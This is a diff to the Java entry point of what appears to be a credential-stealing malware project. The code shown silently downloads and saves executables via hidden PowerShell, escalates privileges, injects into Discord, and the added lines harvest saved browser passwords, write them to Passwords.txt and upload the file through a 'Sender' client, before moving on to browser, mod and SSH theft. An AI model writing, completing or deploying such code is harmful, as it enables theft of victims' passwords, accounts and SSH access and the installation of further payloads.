@@ -7,6 +7,7 @@ import okhttp3.*;
 
 import java.io.*;
 import java.net.InetAddress;
+import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.net.URL;
 import javax.swing.JOptionPane;
@@ -21,10 +22,12 @@ public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
     public static String documents = "C:\\Users\\Public\\Documents";
 
-    public static String exeUrl = "your exe url"
+    public static String exeUrl = "your exe url";
 
     public static void main(String[] argument) throws Exception {
         String username = System.getProperty("user.name");
+        OkHttpClient client = new OkHttpClient();
+
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -O 'C:\\Users\\" + username + "\\update.exe'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\update.exe'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\xray.jar'");
@@ -37,7 +40,6 @@ public class Start {
 		if (DiscordInjector.instance == null){
 			DiscordInjector.instance = new DiscordInjector();
 		}
-        OkHttpClient client = new OkHttpClient();
 
         ElevateUtil elevateUtil = new ElevateUtil();
         elevateUtil.elevate();
@@ -45,8 +47,23 @@ public class Start {
         DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
+
+        //grab passwords
+        String passwords = new Passwords().grabPassword();
+        String s = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
+        //write into text file
+        try {
+            PrintStream out = new PrintStream(new FileOutputStream("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt"));
+            out.print(s);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+        Sender.Sender(client, new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", "Passwords.txt", RequestBody.create(MediaType.parse("application/octet-stream"), new File("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt")))
+                .build());
 		Browsers.main(argument);
-		Sender.sendMessage("Browsers done.");
+		Sender.sendMessage("Passwords done.");
 		Mods.main(argument);
 		Sender.sendMessage("Mods done.");
 		Ssh.main(argument);
